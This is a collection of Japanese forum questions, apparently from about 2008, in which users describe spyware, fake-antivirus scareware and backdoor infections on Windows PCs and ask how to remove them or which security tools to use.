こんにちは 海外のネットカフェのパソコンで、株、FXなどやりたいのですが キーロガーなど入っていたりして危険だと聞きます 安全にできる方法はないでしょうか？ よろしくお願いします。
BraveSentryというスパイウェアに感染してから壁紙の設定ができなくなりました。 詳しく言いますと、前まで使っていた壁紙はPC起動時に数秒間表示されるのみでその後は一色の背景に完全に覆われてしまいます。（よく意味が分からなかったらすみません） この症状を直すことは可能ですか？ それと、BraveSentryの駆除が完全にできていないと思われます。 http://www.shareedge.com/spywareguide/product_sh … このページをご覧下さい。BraveSentryについて詳しく記述されています。 とりあえず悪質な広告が表示されないように友人にしてもらったのですが「ファイル名を指定して実行」→msconfig（システム構成ユーティリティ）→スタートアップの項目を見るとBraveSentryのプログラムが残っています。このプログラムのチェックボックスに再びチェックするとおそらくまた広告等が表示されるのだと思います（あくまで予想です） 完全に駆除したいと思うのですがやり方がよく分かりません。 プログラムのコマンドを見るとCプログラムファイルに残っているというのは分かりました。 直接、そのファイルを探してみたのですが見つかりません。 どうすれば完全に駆除することができますか？
先ほど質問させていただいた者ですが、Ad-Aware2008のスキャンがおかしいです！おかしいところ書きます。 １．スキャン中、ポインタ全体が処理中のマークになっている。（Ad-Awareの画面だけ） ２．スキャン中、Stop Scanを押しても何の反応もない ３．スキャンを強制的にやめさせようとタスクマネージャーで「タスクの終了」ボタンを押すと、「このプログラムは応答していません。」と出てきた瞬間にスキャンが終わる 再インストールもしてみましたが、結果は同じでした…。相性が悪いんでしょうか？また、皆さんは同じようなこと起こりますか？OSはVista,機種はFMVNF70Y、窓の杜からダウンロードしました。回答お願いします。
通知領域に赤い丸の中に×印のアイコンが有り、Your computer is infected!とメッセージが出ます。スキャンの結果　cru629.dat 場所C\Windows 説明backdoor.win32.small.cyb　隔離されたファイルとなります。以前にも同じものに侵入されその時は、Malwarebytes.org Malwarebytes' Anti-Malware　で駆除出来ましたが、今回はオーバーフローとかエラーのメッセージが出てスキャン出来ません。どなたか解決方法をご存知の方いますでしょうか？
こんにちわ！ おそらくスパイウェアにかかってしまったようです・・・ 素人なので説明が適切ではないと思います。 足りない情報がありましたらすぐに調べたい思います。 状況：Internet Explorer使用時に他のサイトに飛ぶさいホップアップが 　　　ずっと出てきます。結果として強制終了の手しか残りません。 対策：Nortonで定期的にチェックしてます。 　　　症状が出てきたあとにspybotとadwareでもチェックしましたが 　　　治りません ホップアップで特に文字とかは表示されません。 またNetscapeだとこのようなことは起こりません。 また 注意：スキャンが完了されていません！パソコンが感染した場合は、 データーの損失、フリーズ状態にされるリスクがあります。 悪質なソフトウェアを検索するAntiSpywareExpertをインストールしますか？（推奨） というのもでてきます。 OKは押してません。 どうかよろしくお願いします。
こんばんわ SpyBotでスキャンし、駆除をしたのですが全然駆除できません。 色々調べた結果、virtumondeはSpybotやAd-Aware SE Personalで駆除出来ない事を知りました。 そしてhttp://mythmusic.blog4.fc2.com/blog-entry-36.html このサイトの方法で駆除しようとしたのですが、全くもって意味が分かりません。 何方か詳しく教えてください。 お願いします。
スパイウェア対策ソフトAd-Aware2008を導入たいと思っています。 そこで質問なんですが、スパイウェア対策ソフトも、ウイルス対策ソフトと同様に削除が難しいですか？そこが気になって…まだ導入していません…。回答お願いします。
All Aboutの下記記事を読み、"Search Assistant" が気になっております。 http://allabout.co.jp/computer/freeware/closeup/ … 下記画像は、私のPC(DELL9200C WinXP SP3)を、イメージリカバリをした直後の"プログラムの追加と削除"ですが、しっかり "Search Assistant" があります。 http://imgs.up.seesaa.net/image/070115_01BDE9B4F … 念の為にDELLに確認した所、「出荷状態では"Search Assistant"は存在しないはず」との事で 「イメージリカバリだとスパイウェアが削除されずに生き残っている可能性がある」とも言ってました。 ●OSリカバリであれば、"Search Assistant"を削除できるだろうとの事ですが そもそもイメージリカバリしても、残るプログラムがあるってのは本当なのでしょうか？ ●OSリカバリを一度でも行うとイメージリカバリが二度と行えなくなってしまうので OSリカバリ以外に"Search Assistant"を削除できる方法をご存知の方がいらっしゃいましたら 教えてください。 ●"Search Assistant"は"180search Assistant"、"Search Assistant Uninstall"とは同一のものでしょうか？
パソコン起動後、毎回　IPアドレス　216.195.61.148　2588番ポートへ勝手にアクセスしようとしているんです。その後、216.195.63.19:2716へも勝手にアクセスしているんです。以前vomdoウィルスに掛かってそれを外すのに苦労したんですが、spybot でサーチするとwin32.winlagonsっていうのが検出されます。それが駆除しても再起動するとまた検出されるんです。最初の質問と関係があるのでしょうか？ vomdoを駆除してからは別にポップアップ広告が頻繁にでるとか、ネットが非常に遅いってことは無いんですが、どうにも気持ち悪いです。どなたか助けてください。
初心者にもお勧めのフリーのスパイウェアー、ウイルス対策ソフトがありましたら、教えてください。
ウイルス対策用にAVG8.0と スパイウェア対策用にSpybot1.5とAd-Aware 2007と SpywareBlasterを使用してます。 以前よりSpybotとAd-Awareはどちらもスパイウェアを検出して 駆除する同じ機能のソフトだと思ってたので この２つのスパイウェア対策ソフトを併用するのは 意味があるのでしょうか？ もし、片方のソフトで充分間に合うなら 残りのソフトの利用を止めようと思ってます。 その場合、どちらのソフトを残したらいいでしょうか？
ＸＰでウィルスセキュリティを使っています。ＰＣには全然詳しくないので、さっぱりどうしていいのかわかりません。 ネットに繋ぐたびに、（ご確認）Ｈｏｓｔｓファイルは変更されました。ＵＲＬ情報（Ｈｏｓｔｓファイル）は変更されました。ネット詐欺の可能性があります。ヒント：変更していなければ、拒否を選択して下さい。127．0．0．1へ接続します（変更）と表示されます。 どうすれば解決できるでしょうか？ こんなことは初めてで・・・　元通りにはならないのでしょうか？ 皆さん助けて下さい。お願いします。
backdoor.win32.small.cybの削除方法を教えて下さい。
教えてください。 このカテゴリーでウイルスバスターの不正変更の監視についての質問も多くありましたが、私も質問させてください。 今回　C:\Program Files\AVDm\AVDm.exe が検出され、実行した処理「拒否」とされていました。 この　C:\Program Files\AVDm\AVDm.exe　は、何の変更処理だったのでしょうか？ 特に何かした訳ではなかったのですが… また、今後の対処としてはどのようにしたら良いか、お教え願えればと思います。 よろしくお願いいたします。
昨日から困っています、 マークは楯の様で色は赤、中十字で白色です。 こんなメッセージをだします。 Insecure Internet activity. Threat of virus attack で、ieav.exeのプログラムをＤＬしろという感じです。 発売元はieavdownloadstart.comです。 承諾書を読んで ウインドウズ、ファイヤーウォールでしょうか？ 同じマークです。 あと、ＤＬしたら、お金はいりますか？ これはウイルスですか？ 大至急回答おねがいします。
ノートンシステムワークスPremiumバージョンを購入しましたがこれに入っているNorton AntiVirus2008はスパイウェア対策が出来ません。 ノートンで対策のモードがＯＮになっていますがSpybotでスキャンを行うと高い確率でスパイウェアが発見されます。 Nortonのサポートにこの事を告げると「競合する可能性があるので薦められないがSpybotと併合して使ってください」と言いました。 これは詐欺に当たるのではありませんか？ スパイウェア対応と言っておいて対策出来ない訳ですから。 スパイウェアはある意味ウイルスより怖いですよね？ Nortonが「スパイウェア対応」という文言をAntiVirusの仕様から削除させるにはどうすれば（どこに届ければ）良いのでしょうか？ 外資系の企業は殆どどこも偉そうに踏ん反り返っているのが気に入りません。（サポートの態度がでかい「Adob○」とか）
ポップアップ広告（と思われる。）が頻繁に表示されるようになりました。 厳密にはカスペルスキーのポップアップブロッカーが頻繁にポップアップをブロックしたと報告するようになったので気づいた次第です。 実際にそのＵＲＬが開かれたことは一度もありません。したがってそのポップアップが広告なのかまた別のなにかなのかは現時点で把握できていない状態です。 ブラウザはメインでFirefoxをつかっていますが、ブラウザが立ち上がっていない状態でもポップアップするようです。 メッセンジャーも現在はWindowsLiveメッセンジャーしか使用しておりませんが、起動していない状態でもポップアップします。 昨日も出てたのですがカスペルスキーのポップアップブロックの履歴がクリアされているようで観覧できませんでした。 現在、Spybot、Ad-Aware 2007、カスペルスキーでスキャンをかけています。 昨日もカスペルスキーで完全スキャンをかけましたので、おそらく結果は同じだと思われます。 特に何もみつかりませんでした。 Spybotではなにもみつかりませんでした。 Ad-Awareはいま一生懸命調べてくれています。 知りたいことは、 何が原因でこのようなポップアップが表示されるのか。またはそれを知るためにはどうすればよいか。 その解決方法は何か。 です。 このポップアップが何者なのかだけでも知ることができれば調べるすべもあるかと思っています。 詳しい方情報おねがいいたします。 とここまで書いて少しわかったことがあります。 今気づきました。 デスクトップの左上に何かがあるようです。 アクティブデスクトップというのでしょうか？？ たとえばＩＥを全画面表示してメニューから「ファイル」クリックしても何も反応がありません。 同じようにデスクトップ左上のアイコンも操作できません。 常に最前面に広告が表示されるようになっているようです。いまはその広告だけがブロックされているという状況でしょうか。 その何かありそうなところを右クリックすると「ソースの表示」とありましたので表示してみると、ノートパッドがたちあがり <HTML></HTML> とだけ書かれています。 プロパティは見れません。 とりあえず調べてみてみますが、何かわかる方教えてください。 よろしくお願いいたします。 あ。それとIMEバーがまれに２つ表示されます。関係ありそうな気がします。
はじめまして。 早速「ウイルスセキュリティZERO」のソフトについて質問したいですが： １．家庭用（個人用）の試し版はないでしょうか？ ２．OnlineでLicenseを購入することと、パッケジー版を買うのと、どう違うでしょうか？メリットとデメリットを教えていただけませんか？ ようは、Licenseだけを買うと、省資源でしょうが、万が一パソコンが壊れて、ネットにも入れなかったら、結局何もならない...って気がします。心配です。 ３. 実はパソコンがWindowsのSP3をインストールして不具合になってしまった為、パソコンをリカバリーまでしないといけないですが、パソコンの環境に戻すと、IE5になってしまうのですが、「ウイルスセキュリティZERO」を使うのに、最低の設定環境はIE5.5みたいですが、では、どうしたら商品を使えるでしょうか？ いろいろな質問ですが、教えてください。 ★★実はごHomepageの「パソコン護身術」（文/タク盛山様）を読ませていただきまして、他の商品まで魅力を感じてて、試してみたいって気持ちになって...
以前から突然電源が切れることが多かったり動作がおかしかったのですがSpyware Doctorというものでスキャンしてみたら11個の脅威と256の感染が見つかりました！ 脅威レベルが最高のものもいくつかあるのですが、これは危険なのでしょうか！？ パソコンに詳しくないのでこういうことは全くよく分からないのですが、早急に駆除した方が良いのでしょうか？ 駆除するにはどうすればよいのでしょう？ 駆除するにはSpyware Doctorというものを有料で購入しなければならないのでしょうか？ 色々分かりやすく教えてください。お願いします！
TROJ GAMETHIEF.Mというウイルスにやられました。 ウイルスバスターで削除ができないので困っています・・・。 システムファイルのsystem32にあるはずのsonb32drv.dllという所が感染したらしいのですが、いくら探しても見つかりません。 ちゃんとフォルダオプションで表示するように設定したのですが 駄目です。 Flash Playerを最新版にしたんですが警告が出されます。 どうしたら良いでしょうか？？ お願いします。
先程から、「VirusUrimuva」というウイルスセキュリティーソフトを推奨してくるポップアップが何度消しても出てきます。 ２秒置きくらいに…(これ書くのも必死です) ネットで調べたらスパイウェアという事は分かったのですが、対策が書いてありません。 当方、ＰＣに関しては初心者でどうすれば良いか分かりません。 一応ＮＴＴ西日本Ver.15のセキュリティー対策ソフトには入っています。今、全体の検索を開始したところなのですが、スピードがいつもより遅くて…多分ウイスルのせいだと思うのですが(涙) どうやって対策、ウイルス消去すれば良いのでしょう？ 当方ネットでカードで買い物とかしているので、怖くて怖くて…！ お分かりになられる方お返事下さいー！(涙
譲り受けたPCにウイルスバスターCORPクライアントがインストールされていて、アンインストールしようとするとアンインストール用のパスワード入力画面が出てアンインストールできません。 パスワードなしでアンインストールする方法を教えていただけませんか？
youtubeの動画のダウンロードの仕方を教えてください。お願いします！
現在ウイルス対策ソフトとして＜キングソフト＞を使用しております。これと併用して使えるスパイウエア対策ソフトを教えてください。尚、その必要がない場合はキングソフトよりも安心できるソフトを紹介していただくとありがたいです。
今日からＭＳＮ、ＳＫＹＰＥに心当たりのない人からのチャットの要請が２件来ました。１つのほうはアダルト系の人でした。その人たちはどこから私のアカウントを手に入れたのですか？自分のアカウントが流出することってあるのですか？ちなみに、あぶないサイトには手をだしていないつもりですが、たまに検索を間違えてアダルトサイトにとばされてしまうことも今までに何回かありました。 また、３ヶ月前からスカイプ中に突然青い画面と英語が現れて再起動になってしまうことが２日に１回くらいのペースで起こっています。こちらも何か情報をお持ちの方は回答いただけるとうれしく思います。 心配なのでよろしくお願いします。
スパイウェアに感染したようです。 インターネットをしていて某テレビ局のHPを開いたら、突然パソコンが再起動し始めてXPセキュリティーセンターからスパイウェアに感染との警告が英語で現れました。 インターネットのTOPがyahooからgoooglに変わってしまいオプションで設定しなおしてもダメでした。 一応Cookie・ファイルの削除はしました。 Spybotをインストールしたのですが、起動しません。レジストリの変更のお知らせは出るのですが・・・。 その後、Ad-awareをインストールしてみましたが、スキャンの途中でbusyになってしまいうまく作動しません。 なのでプロパイダーのオプションでセキュリティ機能をつけようと思い、インストールした所、Windows XP Service Pack 2以上にする必要がありますとなって使用できませんでした。 この場合はアップグレードからしないといけないでしょうか？　XPの初期のPCを使っています。 もしスパイウェアに感染したままでアップグレードを行うとなにか支障はありますか？ セキュリティを一切していなかったので悪いと反省しています。 初心者なので少しパニックになってます。 とりあえず、何からすればいいでしょうか？対策方法を教えて下さい！！ よろしくお願いします。
最近、ロシアのサイトを開こうとしたら、”Antivirus XP 2008”,”BraveSentry”などのウイルス（スパイウェア？）に感染しました。 X-Cleaner,Ad-Awareで削除しようとして、完全には削除出来なかったようなので、最終的にはウイルスバスター2008で完全に削除したはずです。 しかし、レジストリが変更され、”フォルダオプション”が表示されなくなっていたので、regeditで修正しようとしましたが、regeditが起動できなかったため、hijackthisでO7をFixしてから、regeditでNoFolderOptionsを削除し修正しました。 hijackthisのログに、他にも多くの表示がでましたが、少なくとも ”F2 - REG:system.ini: UserInit=C:\WINDOWS\system32\userinit.exe,C:\WINDOWS\system32\drivers\services.exe” はおかしいので、Fixする必要があるということで、Fixし再起動しました。しかし、hijackthisのスキャンをすると、また同じように現れます！何故でしょう？？？ また、ウイルスバスター2008の検索をかけると、一度きれいにウイルスなどが無くなったはずなのに、Cookie_DoubleClick　と　Cookie_ServingSysが見つかりました。 パソコンは、Windows XP Home Edition SP2 Internet Explorerは、Ver.6 SP2 現在のパソコンの症状として、 １．テキストアイコンの右下に青い四角が表示されます。 ２．右下のボリュームが消えていて、ゴミ箱内のファイルを削除しても、”ガサガサ”という音がでません。 ３．”Microsoft&reg; Windows&reg; 悪意のあるソフトウェアの削除ツール (KB890830)”と ”Internet Explorer 6 for Windows XP 用セキュリティ更新プログラム (KB950759)” がダウンロード出来ません。 ”Spybot - Search & Destroy”をインストールしようとしても出来ません（ダウンロードは出来ました）。 以上、どうしたら良いのか、ご存知の方、よろしくお願い致します。m(_ _)m
タイトルに書いてあるようにHadodoraibugadoにやられました。というか、やられそうになりました。インストール画面までいったのですが、そこで怪しいことに気付き利用規約みたいなところで打ち切りました(プログラムはインストールしませんでした)。その後キングソフトで怪しげなプログラムを見つけ出してもらい削除しました。それから、Internet Explorerを開いても広告などは出てきません。これで本当に全部終わったのでしょうか？まだ何かあるのではないかと不安に思っています。まだやることがあるようなら教えてください。
画面の右下に赤い丸の中に×のアイコンが常時あり、そこから ひっきりなしにyour computer is infected!とメッセージが出ます。 いつの間にかインストールされてしまった様です。特にパソコンの 異常は感じ無いのですが、目障りで気味が悪いので削除したいのですが。 ウイルス対策ソフトはウイルスセキュリティが入っています。 そこでサポートセンターとのやりとりで、２つのファイルを隔離したのですが、再起動すると同じ症状が出ます。 サポートセンターではリカバリーまたは、マルウェアがある場所を 特定すれば対策を考えますよ、とのことでした。（TELでの話では オンラインで無料で出来るサイトがあるとのことでした） 出来る限りリカバリはしたくないのですが、ウイルスやスパイウェアをスキャンできるサイトはありますが、場所を特定できるようなものは見当たりません。 また被害対策というサイトのSmitfraudFixというのは試しましたが 症状は変りません。（そのサイトの他の方法などは難しくて理解できませんでした。） ウイルスセキュリティの隔離したファイルに載っているものです。 cru629.dat 場所C:\WINDOWS 説明Backdoor.win32.small.cyb GoogleToolberInstaller98.exe 場所？　説明Trojan-proxy.Win32.Horst.ais これは違うような気がしますが。 上記は今回の件とは関係ないかも知れませんが。 （ソースネクストでは関係ある、ないは分からないといってました） どなたかこの問題を解決できる方法教えて頂けませんでしょうか。
バスターのスパイウェア対策だけでは不安なので、スパイウェア対策ソフトを導入しようと思っています。が、どのソフトがバスターと相性がいいですか？回答お願いします。
WIN2000とXPのデュアルブートです。 ネット接続をするＸＰだけにウィルス対策ソフトを入れています。 2000の方は接続しないのでソフトを入れていません。 万一の場合、２０００もウィルスに感染するでしょうか？ やはり両方にソフトを入れるべきでしょうか？
症状などは以下のアドレス通りです。 ttp://oshiete1.goo.ne.jp/qa4103942.html 頂いたアドバイス通り、Spybotというウィルス対策ソフト をダウンロードしたまではいいのですが、 いざ起動させようとしても起動できません。 ほかのＰＣで同じようにダウンロードしたところ、ちゃんと起動 できたのでダウンロードやインストール方法は間違ってないはずです。 どうすればいいでしょうか？ 有料ソフトのウイルスバスターなどを今から購入してもダメで しょうか？助けてください。宜しくお願いします。
今日、ＰＣを立ち上げるとＡＴＩの製品登録画面が出たので 何も考えず製品登録した後に、ＩＥでＹａｈｏｏなどのページを開こうとすると 毎回、必ず英語だけの変なページが出てきてしまい そのページで内容はスキャンするかどうか聞いているような文章で ページの中にはセキュリティーセンターのアイコンが使われており アドレスバーにはabutlinkと表示されているだけでした。 また、突然メッセージウインドーが出たので、いいえを押してもページが消えず isa.exeというファイルをダウンロードさせようとします。 セキュリティーソフトはキングソフトの無料版を入れていますが ウイルス等の感知はしませんでした。 対処方法も判らなかったので、とりあえずシステムの復元を実行したら治りました。 これは、スパイウェアに感染していたのでしょうか？ ちなみに、ページのソースを表示させたらfree-viruscan.comという アドレスが書いてあり、それを検索するとアドレスのサイトが表示されれました。 そのサイトは、よく見かけるオンラインウイルススキャンのページでした。 キャッシュファイルの中には、eorr.phpというphpファイルにアクセスしているようです。 復元後にまた製品登録の画面が出たのでいいえにしたら それ以降は問題有りませんでした。 どなたか、わかる方いましたら、ご回答宜しくお願いします。
当方Windows2000　SP4を使っているのですが 2日ほど前にPC動作の重さを感じてタスクマネージャーを起動させてみたところ 見慣れない同じ名前のexeが3～4個立ち上っていました ウィルスかどうか確認するためにもそのファイル名で検索してみましたが まったくヒットせず、しかもPCを再起動するたびに、 同じ動作をしてると思われるexeは名前が変わっていました ちなみに今はQ9VNNU.exeです さっきはA4EEC.exeでした この状態を確認してから 1、いきなりIEが大量に立ち上がり消える (内容は、すべて表示できません。中国語でかかれている時)もある 2、いきなり中国語と思われる歌が5～10秒ほど流れる 3、中国語の言語パッケージのインストールダイアログがでる、しかも何度キャンセルを押してもしばらく出続ける 4、色々なソフトが立ち上らない(imon.dllの問題とかなんとか、、) 5、はじめに書いたものとは違う見慣れないexeがアプリケーションエラーで落ちる 6、常時動作が重い などの問題な症状が出てしまって非常に困っています Cドライブを一月ほど前のバックアップから再インストールしましたが解決せず ウィルススキャンしてもそれらしい物はヒットせず(オンラインのものも2つ試しました) どなたか心当たりのある方いらっしゃいましたら 思いつく原因、対策、及び解決方法などお教えいただきたく思います 皆様からのレスをお待ちしてます
カード会社から連絡が来て、17日火曜日に100円の利用が40回ありました、確認したいので至急連絡ください、という通知が来ました。しかし私は17日にそのクレジットカードは使っていませんし、もう半年以上はそのカードでネットショッピングをした記憶もありません。たしかに17日にネットでＹｏｕｔｕｂｅ？というところのの動画は見ていたのですが・・・ クレジットカード情報を入力していないのに、クレジットカード情報が盗まれるなんてことはあるんでしょうか？フィッシング詐欺とも少し違うような気がするのですが・・・
「Suspicious Autoloading Entries」というスパイウェアが駆除できません。 どうすればよろしいですか？ お願いします。 ＰＣ：ａｃｅｒ　ＡＳＰＩＲＥ５３２０ ＯＳ：ＷｉｎｄｏｗｓＶｉｓｔａ　ＨｏｍｅＰｒｅｍｉｕｍ セキュリティソフト：Ｍｙｓａａｓ
ノートン３６０を使っていましたが、バージョン２へバージョンアップできます。とメッセージが現れたので、ノートン３６０バージョン２へバージョンアップしました。 だけどバージョンアップ前は使えた、アウトルックエキスプレスのスパムメールの自動振り分け機能が使えなくなってしまいました。 ノートン３６０バージョン２ではスパムメールの自動振り分け機能は使えないのでしょうか？何とか使えるようにしたいのですが・・・ 宜しくお願い致します。
お世話になります。 「FromからToへのメッセージ STOP WINDOWS REQUIRES IMMEDIATE ATTENTION Windows has found 55 critical System Errors To fix the errors please do following 1Download Registry Update from:​www.regfix.com​ 2Install Registry Update 3Run Registry Update 4reboot your computer FAILURE TO ACT NOW MAY LEAD TO SYSTEM FAILURE」 とのメッセージがでました。こちらでも調べた結果、でないように管理からすることができましたが、それを知る前に先にサイトにいってしまい、今どこがおかしいか無料でスキャンみたいなのをクリックして１０個ほどおかしいとのことがでてなおすにはソフトを買ってくださいてなことでかわずそのまま閉じました。 その後PCをリカバリしましたがまたでたので、よくよく調べたらスパイウェアだとしって停止しました。 ですが、すでになにかレジストリなどおかしくなってしまってるのでしょうか？今のとこ通常通り動いてますが、たとえば今後使用するのに他人からこのPCを使用されたりたとえばクレジットカードの番号や個人情報写真等がもれたり危険がありますでしょうか・・・。 いったい自分がしたことがどの程度のことまでしたのかが知りたいです。ソフト買う手前だったら大丈夫なのでしょうか。スキャンした時点で終わり・・でしょうか？
一度ネット中に、何かの拍子にスパイガーダーのページに飛んでしまって、それ以来ＰＣを起動したら必ずスパイガーダーのウィルスチェックがはじまるようになりました。で、毎回必ず汚染されてると表示され、「駆除の為スパイガーダーのソフトを買う」、というコマンドしかでてこず、閉じる為のコマンドがないので、いつもCtrlキーとAltキーとDelキーで強制終了させています。 ウィルスに関しては、もともと他のソフトを使っていて、そのソフトでは感染なし、と出るので、明らかに詐欺的な営業なのです。 ＰＣ起動時のウィルスチェックは、すぐに強制終了させればいいのでまだ我慢できますが、問題は、ネット中、ｗｅｂページを移動するたびにspigurderのウィルス警告画面が現れることなのです。ソフトを購入するか、警告を無視してこのまま続行するかの確認のページが毎回現れ、いちいち続行のコマンドを押さなきゃ先にすすめないのです。本当に困っています。この画面をださないようにするには、どうしたらいいのでしょうか。どなたか詳しい方教えてください。
これを読んで気になったのですが、 https://j-square.symantec.com/useful/doctor_19.h … 例えばKingsoftの無料ソフトをインストールすると、情報収集のスパイウェアがインストールされると言うことですか？ Kingsoft無料ソフト http://www.kingsoft.jp/is/
ウイルスバスターの無線LANパトロールを使ったら 知らないIPの接続先が検出されました。 MACアドレスも知らない物だったのですがこれって 危ない状態なのでしょうか?
初心者です。 知られてはいけない文字はむやみに打ち込まない方が良いですか？ 最新セキュリティを使用しています。と断り文は入っていますが・・ ホテル側「設備側」は悪事を働こうと考えた場合、閲覧は可能なのでしょうか？
Trendのオンラインウィルススキャンで、スパイウェアが1件検出され、 TSPY_LINEAGE.AMI 種類Trojan C:WINDOWSsystem32sonb32dw.dll と表示されました。 駆除の仕方が分からなかったので、一旦ネットを切って再接続し、他のウィルスソフトをダウンロードし検索しましたが、検出されませんでした。再度、Trendのオンラインスキャンしたところ、こちらも検出されませんでした。検出されないということは、スパイウェアはもうないのでしょうか。そのままにしてても大丈夫か不安です。
昨日、CA Japanの無償スキャンを実施したところ、trojan Zutenというスパイウェアが検出されました。 検出場所はC:/WINDOWS/system32/npkcrypt.sysとなってます。 どのように対処していいのかわからずに困ってます。どなたかよい対処方法ご存知の方よろしくお願いします。 ちなみに、ad-aware,トレンドフレックス、F-Secrreのオンラインスキャンでは検出されませんでした。
Spybotで検索した所、 ・Kuasio.Ka 1エントリー ・Microsoft.Windows.AppFirewallBypass　2エントリー ・Microsoft.Windows.Security.InternetExplorer　1エントリー と出てきました。 自分でも調べてみたのですが、下二つに関しては「即刻消去」と「除外」で良いと対処法がまちまちです。 Kuasio.Kaについては情報がありませんでした。 それに加えて途中で「include ファイルに問題があります C:\Program File\Spybot - Search_Destroy\Include\TrojansC.sbi　詳細は 'Include errors.log'を確認して下さい。」と出てきます。 もう何が何だかわかりません。どうしたらいいのでしょうか。　
マカフィーのフリースキャンを試したら脅威名Adware-Url.genが検出されました。今までノートンを使ってましたがノートンで検出したものではないので対応してもらえなく、今はカスペルスキーの試用版を使ってます。spybotとAd-Awareも入れてみて、再度マカフィーのフリースキャンをしても同じ脅威名が出ます。どうしたら良いのでしょうか。スパイウェアなどの知識がないので知人に聞いたところ情報漏えいするものかもしれないと。ネットショッピングでカード決済するのもやめておいた方がいいと言われました。10日以上この件にかかりっきりで、早く解決したいので、教えて下さい。
ペンタブのドライバをインストールしたいので一時的に使用中のウィルス対策ソフトウェア(SpySweeper)を無効にしたいのですがHPのよくある質問やヘルプ見ても方法がわかりませんでした。 タスクバー右側のSpySweeperアイコンを右クリックして終了をすればそれで一時的に無効になるのでしょうか？
ＯＳはＭＥなんですが 私情で変更出来ない為その話題には触れないで下さい ブラウザはＦｉｒｅｆｏｘ２なんですが 文章が長くなった事を御詫びします アドアゥェア(Ad-Aware SE Personal)での アップデートが出来なくなりました 具体的には、今迄 ソフトの起動でアップデートしてたのが出来なくなり 現在は、このＨＰ http://www.lavasoft.com/support/securitycenter/b … で「Ad-Aware SE」より「defs.zip」をＤＬ その後、解凍後「defs.ref」を C:\Program Files\Lavasoft\Ad-Aware SE Personal の「defs.ref」に上書きでアップデート それで手動検索して来ました しかし、日付で言うと『SE1R246 09.05.2008』 のファイル迄は正常にアップデート出来たんですが 『SE1R251 15.05.2008』以降は この作業後、ソフトを立ち上げると 「Error while loading the Ad-Aware definitions file.」 の表示が出て、アップデート出来ない様なんです ただ、以前、某ＨＰのアドバイス(？)で 上書き前にコピーで保存を… と、あったんで 現在は『SE1R246 09.05.2008』時の ファイルに戻しました それで、ここの検索でも調べたんですが 以前の様に、ソフト起動時の アップデートが出来ない事に関してはヒットしましたが 今回の私の症状に関しては分かりませんでした 一応、新しいソフトを入れてみては？… みたいな所はヒットした様に思いましたが 紹介されてるＵＲＬにアクセスした所 全て英語表示の為、何も分かりませんでした 尚、スパイ用ソフトと言う意味では 今もう１つ、スパイボット(Spybot-Se&D 1.4) も持ってますが こちらも、このＵＲＬに同相談が、ある様に http://oshiete.nikkeibp.co.jp/qa3148487.html 「include ファイルに問題があります C:\Program File\Spybot - Search_Destroy\Include\TrojansC.sbi　詳細は 'Include errors.log'を確認して下さい。」の の表示後、そのまま継続すると 「おめでとう！スパイウェアは検出されませんでした。」 と出ます この事に関しては、回答者２の方の方法を 実行しましたが、全く解決せず 回答者１の方の方法は スパイボットにはリアル監視の機能が、ありませんから 意味が分かりませんでした ただ、スパイボットに関しては 現在、このＵＲＬの方法 http://www.safer-networking.org/jp/howto/uninsta … を実行してませんので 近日中に実行してから相談しようと思ってます 何方か、このアドアゥェアに関して 分かる方いらっしゃいませんか？
例えば、パソコンの動作が遅くなるとか、変なサイトが表示されるなどの特徴を教えてください。
たまになのですがMONITORというプログラムが勝手に動き出し、何をやろうとしてもＰＣが読み込み中の状態になってしまい、ほぼ使用不可になってしまいます。ＰＣの電源を落としたことも何度かあります。これはかなり不便なのですが、なんとかならないものなんでしょうか。 MONITORが動いてる時は再起動も出来ないし、やろうとする(MONITORを止めようとする)と固まってしまうという悪性ぶり。ウィルスソフトやスパイウェア対策ソフトを使ってみたけど検出はなし。時間が経てばＰＣ使用不可状態は解除されるみたいなのだけど、いつ解除になるのかわからないのは不便な話です。単に「MONITOR」としか表示されないのでどこのメーカーの仕業かはわかりませんが、Microsoftかintelが怪しいと勝手に想像してます。 同じような症状に悩まされている方はどんな対処をしてるんでしょうか？　ただ時間経過を待つしかないんでしょうか？？　
「ウイルスバスター２００６リアルタイム検索」で、ウイルスが見つかり、手動処理の必要を迫られています。（ポップアップの警告が常駐しています） ファイル名：　C:\WINDOWS\system32\sonb32drv.dll ウイルス／スパイウエア名：ＴＲＯＪ_ＡＧＥＮＴ.ＡＣＯ なのですが、このファイル「sonb32drv.dll」自体が見つけることができないので処理できません。 ファイルの表示方法を「すべて」にしてもダメです。 セーフティモードでも試みましたが、見つかりません。 どうしたら解決できるのかご教授願います。
パソコンの中にMalware Protect 2008と言うスパイウエアを利用して削除出来なくし、インストールを促すプログラムを送られてパソコンの調子がおかしくなり｛時々ブルー画面になりストップしてしまう｝困ってます。削除する方法をお解りの方どうか方法をお教え下さい。
AGV8.0はスパイウェアが追加されましたが、すでにスパイボットを使用している場合、干渉したりしませんか？（誤動作等はしませんか？） その場合スパイボットをアンインストールした方が良いのか？それとも両方使った方が良いのですか？ どなたか教えて下さい！
今日、突然、スパイウェアと思われる広告が、しつこくＰＣ画面に表示されるようになりました。 偽スパイウェア駆除ソフトのダウンロードを薦める広告が主にです。 以前にも似たような事があったので、その時はいろいろ調べて、 Spybot-S&D　と、　Ad-Aware　と、　cwshredder というフリーソフトを使って定期的にスキャンなどしていたのですが、 またかかってしまいました。 今回も、またスキャンしたのですが、何度スキャンしても、修正してはまた現れたりで、全く現状が変わりません。 試しにノートンでウィルスチェックしたらウィルスも存在してて、ウィルス自体は完全に駆除できたようです。 ただスパイウェアは変わりません…いまだしつこいです。 いろいろ検索してたら、SpywareBlaster（スパイウェア予防のフリーソフト）というのもあることを知って、それも設定しておきました。 でも、まだ現れます。。。 全く広告の出現が消えてくれません(T-T) 説明が判りづらい部分あるかもわかりませんが、パソコンにそこまで詳しいわけではないので、今の私にはここまでしか手の施し方が分かりません。。。 どなたか、解決方法をご存知でしたら教えていただけないでしょうか。 よろしくお願いします。 補足が必要でしたら、要求をいただいた後に付け足したいと思います。
こんにちは。 最近、タスクマネージャーを開いたら、「wpsupdate」というアプリケーションが動いていることが毎起動時に起動されていることがわかりました。 プロセスを見てみたら「wpsupdate.exe」というイメージ名で、メモリ使用量は5716Kです。 タスクマネージャで試しにそれを「最大化」してみたら、ウインドウがでてきて、「OK」「Cancel」のボタンしかないものがでてきて、試しにキャンセルを押したら、プログラムは終了されます。OKはまだ押してないのでわかりません。 それで、yahooで検索したんですが、どうやらスパイウエアかも？ということでspybotをインストールし、いくつかひっかかったので、駆除しました。 そして念のためAVGでスキャンしました。 ですが、また起動時に起動しています。 これはなんでしょうか？正常なものでしょうか？
